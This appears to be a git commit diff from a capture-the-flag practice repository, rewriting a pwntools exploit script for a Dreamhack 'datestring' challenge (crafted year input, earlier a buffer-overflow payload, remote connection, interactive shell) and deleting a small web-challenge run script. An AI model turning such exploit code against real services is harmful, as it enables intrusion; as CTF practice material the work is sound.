139549f3a70a52a50016ae177c919ef6aacb0ed4
zwxxb <elsassiamine@gmail.com>
2025-07-24 14:19:48 +0200

    dumped challs - fun

--- dreamhack/pwn/date/datatime/exp.py
+++ dreamhack/pwn/date/datatime/exp.py
@@ -1,19 +1,21 @@
 from pwn import *
 
-# Start the process
-p = process("./datestring")  # Replace with the actual binary path
+# Set up connection
+context.log_level = 'DEBUG'
+elf = context.binary = ELF('./datestring')
 
-# Craft the payload
-# Fill the 28-byte buffer and overwrite v17 with 1
-payload = b'A' * 28 + p32(1)  # Buffer overflow to set v17 to 1
+def exploit():
+    #p = process('./datestring')
+    p = remote('host1.dreamhack.games', 14886)
+    
+    p.sendlineafter(b"Year: ", b"100000005")
+    p.sendlineafter(b"Month: ", b"12")
+    p.sendlineafter(b"Day: ", b"25")    
+    p.sendlineafter(b"Hour: ", b"2")
+    p.sendlineafter(b"Minute: ", b"2")
+    p.sendlineafter(b"Second: ", b"2")
+    
+    p.interactive()
 
-# Run the exploit
-p.sendlineafter(b"Year: ", b"2147483647214748364721474836472147483647214748364721474836472147483647")     # Input the year (2016) as bytes
-p.sendlineafter(b"Month: ", b"12")      # Input the month (December) as bytes
-p.sendlineafter(b"Day: ", b"25")        # Input the day (25th) as bytes
-p.sendlineafter(b"Hour: ", b"0")       # Input any valid hour (12) as bytes
-p.sendlineafter(b"Minute: ", b"0")      # Input any valid minute (0) as bytes
-p.sendlineafter(b"Second: ", b"59")   # Overflow the buffer in the second input
-
-# Interact with the shell
-p.interactive()
+if __name__ == "__main__":
+    exploit()
--- dreamhack/web/todo/run.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-sqlite3 deploy/mydatabase.db < deploy/create.sql
-cd deploy
-npm run dev -- --host 0.0.0.0
